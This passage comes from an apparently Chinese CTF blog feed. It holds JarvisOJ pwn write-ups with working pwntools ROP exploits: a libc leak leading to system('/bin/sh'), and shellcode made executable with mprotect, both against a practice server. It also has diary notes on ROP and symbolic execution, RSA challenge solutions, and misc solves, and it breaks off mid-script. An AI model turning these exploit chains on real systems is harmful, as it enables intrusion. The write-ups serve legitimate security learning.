class="number">8</span>))</span><br><span class="line"></span><br><span class="line">libc_system = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">libc_write = libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">libc_sh = libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">system_addr = write_addr - libc_write + libc_system</span><br><span class="line">sh_addr = write_addr - libc_write + libc_sh</span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">0x88</span> +p64(pdr_addr) + p64(sh_addr) + p64(system_addr)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="JarvisOJ-level5"><a href="#JarvisOJ-level5" class="headerlink" title="JarvisOJ level5"></a>JarvisOJ level5</h3><p>由于mmap需要的参数过多，很难找到符合条件的gadgets。参考其他大佬的做法是，先将shellcode写到.bss段，然后用函数mprotect修改.bss段的权限，使其可执行。由此，基本思路是，首先泄露内存地址，然后调用read(0,bss_addr,0x100)将shellcode写入.bss段，然后调用mprotect(0x600000,0x1000,7)修改.bss段的权限，最后执行shellcode即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">p = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9884</span>)</span><br><span class="line"><span class="comment">#p = process('./level3_x64')</span></span><br><span class="line">level5 = ELF(<span class="string">'level3_x64'</span>)</span><br><span class="line">libc = ELF(<span class="string">'libc-2.19.so'</span>)</span><br><span class="line">vulfun_addr = <span class="number">0x4005E6</span></span><br><span class="line">plt_write = level5.plt[<span class="string">'write'</span>]</span><br><span class="line">plt_read = level5.plt[<span class="string">'read'</span>]</span><br><span class="line">got_write = level5.got[<span class="string">'write'</span>]</span><br><span class="line">pdr_addr = <span class="number">0x4006b3</span></span><br><span class="line">psr_addr = <span class="number">0x4006b1</span></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0x88</span> + p64(pdr_addr) + p64(<span class="number">1</span>) + p64(psr_addr) + p64(got_write) + p64(<span class="number">0</span>) + p64(plt_write) + p64(vulfun_addr)</span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">libc_mprotect = libc.symbols[<span class="string">'mprotect'</span>]</span><br><span class="line">libc_write = libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">mprotect_addr = write_addr - libc_write + libc_mprotect</span><br><span class="line">pxr_addr = write_addr -libc_write + <span class="number">0x1b8e</span></span><br><span class="line">bss_addr = level5.bss()</span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">0x88</span> + p64(pdr_addr) + p64(<span class="number">0</span>) + p64(psr_addr) +p64(bss_addr) + p64(<span class="number">0</span>) + p64(plt_read) + p64(vulfun_addr)</span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload3 = <span class="string">'a'</span>*<span class="number">0x88</span> + p64(pdr_addr) + p64(<span class="number">0x600000</span>) + p64(psr_addr) + p64(<span class="number">0x1000</span>) + p64(<span class="number">0</span>) + p64(pxr_addr) + p64(<span class="number">7</span>) + p64(mprotect_addr) + p64(bss_addr)</span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>在上述实现代码中，构造gadget的时候，首先通过pop rdi,ret和pop rsi,pop r15,ret泄露地址，然后得到libc的基质，然后通过libc中的pop rdx,ret传递第三个参数，执行mprotect()。除此之外，还可以通过__libc_csu_init中的代码构造gadget，可利用的代码部分如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400690 &lt;+64&gt;:mov    rdx,r13</span><br><span class="line">0x0000000000400693 &lt;+67&gt;:mov    rsi,r14</span><br><span class="line">0x0000000000400696 &lt;+70&gt;:mov    edi,r15d</span><br><span class="line">0x0000000000400699 &lt;+73&gt;:call   QWORD PTR [r12+rbx*8]</span><br><span class="line">0x000000000040069d &lt;+77&gt;:add    rbx,0x1</span><br><span class="line">0x00000000004006a1 &lt;+81&gt;:cmp    rbx,rbp</span><br><span class="line">0x00000000004006a4 &lt;+84&gt;:jne    0x400690 &lt;__libc_csu_init+64&gt;</span><br><span class="line">0x00000000004006a6 &lt;+86&gt;:add    rsp,0x8</span><br><span class="line">0x00000000004006aa &lt;+90&gt;:pop    rbx</span><br><span class="line">0x00000000004006ab &lt;+91&gt;:pop    rbp</span><br><span class="line">0x00000000004006ac &lt;+92&gt;:pop    r12</span><br><span class="line">0x00000000004006ae &lt;+94&gt;:pop    r13</span><br><span class="line">0x00000000004006b0 &lt;+96&gt;:pop    r14</span><br><span class="line">0x00000000004006b2 &lt;+98&gt;:pop    r15</span><br><span class="line">0x00000000004006b4 &lt;+100&gt;:ret</span><br></pre></td></tr></table></figure><p>首先调用0x00000000004006aa处的gadget，再调用0x0000000000400690处的gadget。由此可以实现对rdi、rsi、rdx三个寄存器赋值，并且跳转到r12+rbx*8处执行。实现代码如下</p>]]></content>
      
      <categories>
          
          <category> Binary security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2018/8</title>
      <link href="/2018-8/"/>
      <url>/2018-8/</url>
      <content type="html"><![CDATA[<p>8月日总结</p><a id="more"></a><h3 id="0804"><a href="#0804" class="headerlink" title="0804"></a>0804</h3><p>tip：gmpy2几个取模数函数的细微区别</p><table><thead><tr><th>函数名</th><th>区别</th></tr></thead><tbody><tr><td>f_mod(x,y)</td><td>取得的模数与y的符号相同</td></tr><tr><td>c_mod(x,y)</td><td>取得的模数与y的符号相反</td></tr><tr><td>t_mod(x,y)</td><td>取得的模数与x的符号相同</td></tr></tbody></table><h3 id="0806"><a href="#0806" class="headerlink" title="0806"></a>0806</h3><p>收获总结：</p><ol><li>rop链的本质是构造假栈帧</li><li>aslr和pie的区别，aslr不会将.bss和.data段代码地址随机化，pie是讲整个进程的地址随机化。</li><li>内存泄漏基本手段及怎样通过内存泄漏来搜索内存找到system()的地址</li></ol><h3 id="0807"><a href="#0807" class="headerlink" title="0807"></a>0807</h3><p>收获总结：</p><ol><li><p>x64和x86参数传送方式不一样</p></li><li><p>使用工具查找简单的gadgets</p><img src="/2018-8/1533619420293.png"><img src="/2018-8/1533619490619.png"><img src="/2018-8/1533619548055.png"></li></ol><h3 id="0808"><a href="#0808" class="headerlink" title="0808"></a>0808</h3><p>收获总结：</p><ol><li>符号执行其实是将输入符号化，并形式化的表示地表示符号执行地过程。有点类似于编译原理中的语义分析，都是形式化的表示程序做了什么（都可以被称作语义信息），不同在于一个是为了编译程序使得机器可以理解，一个是分析程序使得人可以更好的理解。在语义分析的过程中最麻烦的问题是状态爆炸，在符号执行的过程中也有类似的问题被称为路径爆炸；除此之外符号执行还可能遇到表达式不可解的问题。前者可以通过减支加上系统化或启发式路径选择算法来优化，也可以使用Concolic Execution，这种方法有点像深度优先搜索，在此方法基础上改进除了KLEE。后一个问题，有一种改进策略是将某些无法计算的表达式中的符号替换为缺定制，这样会造成路径不完全的问题，当然现在求解器能力也有一定的提高，也是解决问题的一种途径。</li><li>AEG(Automatic Exploit Generation)漏洞利用自动化。像是一种理想化的数学模型，给AEG系统一个输入程序，输出一个exploit脚本或者直接弹出shell。比如现在流行的Fuzzer，给一个程序就能循序找到很多导致程序崩溃的输入。另外由于符号执行能得到大量语义信息，也可以作为AEG系统的重要一环。感觉有很多技术细节并不理解，特别是基于符号执行的漏洞挖掘，看得很迷。</li></ol>]]></content>
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>RSA集合</title>
      <link href="/RSA%E9%9B%86%E5%90%88/"/>
      <url>/RSA%E9%9B%86%E5%90%88/</url>
      <content type="html"><![CDATA[<h1 id="RSA有毒"><a href="#RSA有毒" class="headerlink" title="RSA有毒"></a>RSA有毒</h1><ul><li style="list-style: none"><input type="checkbox" checked> Jarvis OJ Medium RSA </li><li style="list-style: none"><input type="checkbox" checked> Jarvis OJ hard RSA</li><li style="list-style: none"><input type="checkbox" checked> Jarvis OJ very hard RSA</li><li style="list-style: none"><input type="checkbox"> Jarvis OJ Extremely hard RSA</li><li style="list-style: none"><input type="checkbox"> God Like RSA </li></ul><a id="more"></a><h2 id="Jarvis-OJ-Medium-RSA"><a href="#Jarvis-OJ-Medium-RSA" class="headerlink" title="Jarvis OJ Medium RSA"></a>Jarvis OJ Medium RSA</h2><p>首先用如下命令得到n的值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -noout -text -inform PEM -<span class="keyword">in</span> pubkey.pem -pubin</span><br></pre></td></tr></table></figure><p>n的值如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00c2636ae5c3d8e43ffb97ab09028f1aac6c0bf6cd3d70ebca281bffe97fbe30dd</span><br></pre></td></tr></table></figure><p>做素数分解得到p和q，编写如下代码得到flag，注意解密得到的16进制是基数位，所以从第二位开始以ascii码输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">n = <span class="number">0x00c2636ae5c3d8e43ffb97ab09028f1aac6c0bf6cd3d70ebca281bffe97fbe30dd</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">enc = <span class="number">0x6D3EB7DF23EEE1D38710BEBA78A0878E0E9C65BD3D08496DDA64924199110C79</span></span><br><span class="line">p =  <span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">q =  <span class="number">319576316814478949870590164193048041239</span></span><br><span class="line">d = gmpy2.invert(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">msg = gmpy2.powmod(enc,d,p*q)</span><br><span class="line">flag = str(hex(msg))</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line">flag = flag[<span class="number">3</span>:]</span><br><span class="line">c = binascii.a2b_hex(flag)</span><br><span class="line"><span class="keyword">print</span> c</span><br></pre></td></tr></table></figure><p>flag如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PCTF&#123;256b_i5_m3dium&#125;</span><br></pre></td></tr></table></figure><h2 id="Jarvis-OJ-hard-RSA"><a href="#Jarvis-OJ-hard-RSA" class="headerlink" title="Jarvis OJ hard RSA"></a>Jarvis OJ hard RSA</h2><p>拿到这个题目发现和上一题非常相似，连n都是一样，但是这里的e = 2。一开始还是想像上一题一样的解法，然而，它果然不会让人这么轻易拿到flag。隐隐约约记得老师上课的时候讲过模n二次根的算法，一翻发现了Rabin公钥密码，是这个没跑了。然后我们用二次符号判断enc(mod p)和enc(mod q)是否是p或q的平方剩余。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~/Temp<span class="comment"># python</span></span><br><span class="line">Python <span class="number">2.7</span><span class="number">.14</span>+ (default, Dec  <span class="number">5</span> <span class="number">2017</span>, <span class="number">15</span>:<span class="number">17</span>:<span class="number">02</span>) </span><br><span class="line">[GCC <span class="number">7.2</span><span class="number">.0</span>] on linux2</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> <span class="keyword">or</span> <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>enc = <span class="number">0x6D3EB7DF23EEE1D38710BEBA78A0878E0E9C65BD3D08496DDA64924199110C79</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p =  <span class="number">275127860351348928173285174381581152299</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q =  <span class="number">319576316814478949870590164193048041239</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x1 = enc % p</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>gmpy2.jacobi(x1,p)</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x2 = enc % q</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>gmpy2.jacobi(x2,q)</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>gmpy2.f_divmod(p,<span class="number">4</span>)</span><br><span class="line">(mpz(<span class="number">68781965087837232043321293595395288074L</span>), mpz(<span class="number">3</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>gmpy2.f_divmod(q,<span class="number">4</span>)</span><br><span class="line">(mpz(<span class="number">79894079203619737467647541048262010309L</span>), mpz(<span class="number">3</span>))</span><br></pre></td></tr></table></figure><p>经过上述判断，我们就可以用存在二次根的数x1和x2求解二次根，最后用中国剩余定理得到明文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">enc = <span class="number">0x39DE036DE3132757E819F769EAD64BB487EE3F47E67843AFB73748FD9E979BE0</span></span><br><span class="line">p =  <span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">q =  <span class="number">319576316814478949870590164193048041239</span></span><br><span class="line">n = <span class="number">0x00c2636ae5c3d8e43ffb97ab09028f1aac6c0bf6cd3d70ebca281bffe97fbe30dd</span></span><br><span class="line">xp = gmpy2.powmod(enc,(p+<span class="number">1</span>)/<span class="number">4</span>,p)</span><br><span class="line">xq = gmpy2.powmod(enc,(q+<span class="number">1</span>)/<span class="number">4</span>,q)</span><br><span class="line">inv_q = gmpy2.invert(q,p)</span><br><span class="line">inv_p = gmpy2.invert(p,q)</span><br><span class="line">c1 = xp*q*inv_q</span><br><span class="line">c2 = xq*p*inv_p</span><br><span class="line">m = <span class="string">''</span></span><br><span class="line">m = hex(gmpy2.f_mod(c1+c2,n))[<span class="number">2</span>:] + hex(gmpy2.f_mod(c1-c2,n))[<span class="number">2</span>:] + hex(gmpy2.f_mod(c2-c1,n))[<span class="number">2</span>:] + hex(gmpy2.f_mod(<span class="number">0</span>-c1-c2,n))[<span class="number">2</span>:]</span><br><span class="line">c = binascii.a2b_hex(m[<span class="number">1</span>:])</span><br><span class="line"><span class="keyword">print</span> c</span><br></pre></td></tr></table></figure><p>得到flag为</p><img src="/RSA集合/1533366636149.png" title="hardRSA"><h2 id="Jarvis-OJ-very-hard-RSA"><a href="#Jarvis-OJ-very-hard-RSA" class="headerlink" title="Jarvis OJ very hard RSA"></a>Jarvis OJ very hard RSA</h2><p>通过加密代码可知，这两个加密文件共用了模数，自然想到模数攻击，其原理如下<br>$$<br>c_1 = m^{e_1} \mod n<br>$$</p><p>$$<br>c_2 = m^{e_2}\mod n<br>$$</p><p>$$<br>若e_1和e_2互素，有re_1+se_2 = 1，则可以根据<br>$$</p><p>$$<br>(c_1)^r*(c2)^s = m^{re_1+se_2} = m \mod n<br>$$</p><p>所以编写solve.py如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e1 = <span class="number">17</span></span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line">a = gmpy2.gcdext(e1,e2)</span><br><span class="line">r = int(a[<span class="number">1</span>])</span><br><span class="line">s = int(a[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">fo1 = open(<span class="string">'flag.enc1'</span>,<span class="string">'rb'</span>)</span><br><span class="line">fo2 = open(<span class="string">'flag.enc2'</span>,<span class="string">'rb'</span>)</span><br><span class="line">c1 = fo1.read()</span><br><span class="line">c1 = int(c1.encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line">c2 = fo2.read()</span><br><span class="line">c2 = int(c2.encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line">fo1.close()</span><br><span class="line">fo2.close()</span><br><span class="line"></span><br><span class="line">N = <span class="number">0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929L</span></span><br><span class="line"></span><br><span class="line">m = (gmpy2.powmod(c1,r,N)*gmpy2.powmod(c2,s,N))%N</span><br><span class="line">flag = hex(m)</span><br><span class="line">flag = binascii.a2b_hex(flag[<span class="number">2</span>:])</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>得到flag如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PCTF&#123;M4st3r_oF_Number_Th3ory&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>水题集合</title>
      <link href="/%E6%B0%B4%E9%A2%98%E9%9B%86%E5%90%88/"/>
      <url>/%E6%B0%B4%E9%A2%98%E9%9B%86%E5%90%88/</url>
      <content type="html"><![CDATA[<h1 id="水一水"><a href="#水一水" class="headerlink" title="水一水"></a>水一水</h1><ul><li style="list-style: none"><input type="checkbox" checked> JarvisOJ  basic_help!!</li><li style="list-style: none"><input type="checkbox" checked> afctf 数据恢复2</li><li style="list-style: none"><input type="checkbox" checked> 网鼎杯 advenced</li><li style="list-style: none"><input type="checkbox" checked> 中科大hacker game 喵咪遥控器</li><li style="list-style: none"><input type="checkbox" checked> 中科大hacker game 喵咪克星</li></ul><a id="more"></a><h2 id="JarvisOJ-basic-help"><a href="#JarvisOJ-basic-help" class="headerlink" title="JarvisOJ  basic_help!!"></a>JarvisOJ  basic_help!!</h2><p>打开压缩包发现有加密，但是拖到爆破软件中未能得到密码，查找资料发现可能是伪加密。用010editor查看文件，并修改二进制文件。修改结果如下，也就是将ushort deFlags的值将09改为00</p><img src="/水题集合/1532439460327.png" title="help!!_1"><p>进行了这个修改之后，就可以直接将压缩文件解压，是一个word文件，打开如下</p><img src="/水题集合/1532440354909.png" title="help!!_2"><p>考虑这是一种word隐写（关于word隐写的各种类型和破解方法详看这个博客<a href="https://blog.csdn.net/drondong/article/details/79322799" target="_blank" rel="noopener">https://blog.csdn.net/drondong/article/details/79322799</a>  ），而这个word的隐写方式为博客中的第三种，解压后得到几个文件夹，最后在word&gt;media中找到了flag如下</p><img src="/水题集合/1532440672940.png" title="help!!_3"><h2 id="afctf-数据恢复2"><a href="#afctf-数据恢复2" class="headerlink" title="afctf 数据恢复2"></a>afctf 数据恢复2</h2><p>打开压缩包发现有大量的文件夹，文件夹最底层才是可能存在flag的txt文件，编写脚本提取字符串并输出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">path = <span class="string">r'C:\Users\Max_Wang\Documents\CTF\Challenge\Misc\temp'</span></span><br><span class="line">text = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> root,dirs,files <span class="keyword">in</span> os.walk(path,topdown=<span class="keyword">False</span>):</span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> files:</span><br><span class="line">        temp = os.path.join(root,name)</span><br><span class="line">        <span class="keyword">if</span> temp.endswith(<span class="string">'.txt'</span>):</span><br><span class="line">            f = open(temp)</span><br><span class="line">            text = f.read()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'afctf'</span> <span class="keyword">in</span> text:</span><br><span class="line">                <span class="keyword">print</span> text</span><br></pre></td></tr></table></figure><p>得到flag</p><blockquote><p>afctf{Traver31ng_the_d1rect0ry}</p></blockquote><h2 id="网鼎杯-advenced"><a href="#网鼎杯-advenced" class="headerlink" title="网鼎杯 advenced"></a>网鼎杯 advenced</h2><p>看到writeup之后，真的觉得这道题就是用来耍我们的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: ascii -*-</span></span><br><span class="line">enc = <span class="string">'K@LKVHr[DXEsLsYI@\\AMYIr\\EIZQ'</span></span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        s+= chr(ord(enc[i]) ^ <span class="number">45</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">         s+= chr(ord(enc[i]) ^ <span class="number">44</span>)</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure><p>解得flag如下</p><blockquote><p>flag{d_with_a_template_phew}</p></blockquote><h2 id="中科大hacker-game-喵咪遥控器"><a href="#中科大hacker-game-喵咪遥控器" class="headerlink" title="中科大hacker game 喵咪遥控器"></a>中科大hacker game 喵咪遥控器</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">canvas = np.ones((<span class="number">600</span>,<span class="number">600</span>,<span class="number">3</span>),dtype=<span class="string">"uint8"</span>)</span><br><span class="line">canvas = canvas*<span class="number">255</span></span><br><span class="line">list = open(<span class="string">"C:\Users\Max_Wang\Desktop\seq.txt"</span>).read()</span><br><span class="line">r_point = [<span class="number">7</span>,<span class="number">7</span>]</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> list:</span><br><span class="line">    canvas[r_point[<span class="number">0</span>],r_point[<span class="number">1</span>]] = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> c ==<span class="string">'D'</span>:</span><br><span class="line">        r_point[<span class="number">0</span>] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> c == <span class="string">'R'</span>:</span><br><span class="line">        r_point[<span class="number">1</span>] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> c == <span class="string">'U'</span>:</span><br><span class="line">        r_point[<span class="number">0</span>] -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r_point[<span class="number">1</span>] -= <span class="number">1</span></span><br><span class="line">cv2.imwrite(<span class="string">"1.jpg"</span>,canvas)</span><br><span class="line">cv2.imshow(<span class="string">"Canvas"</span>,canvas)</span><br><span class="line">cv2.waitKey(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h2 id="中科大hacker-game-喵咪克星"><a href="#中科大hacker-game-喵咪克星" class="headerlink" title="中科大hacker game 喵咪克星"></a>中科大hacker game 喵咪克星</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'202.38.95.46'</span>,<span class="number">12009</span>))</span><br><span class="line">s.recv(<span class="number">2048</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    expression = s.recv(<span class="number">0x200</span>).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    expression = expression.replace(<span class="string">'exit()'</span>,<span class="string">"None"</span>)</span><br><span class="line">    expression = expression.replace(<span class="string">'__import__(\'time\').sleep(100)'</span>,<span 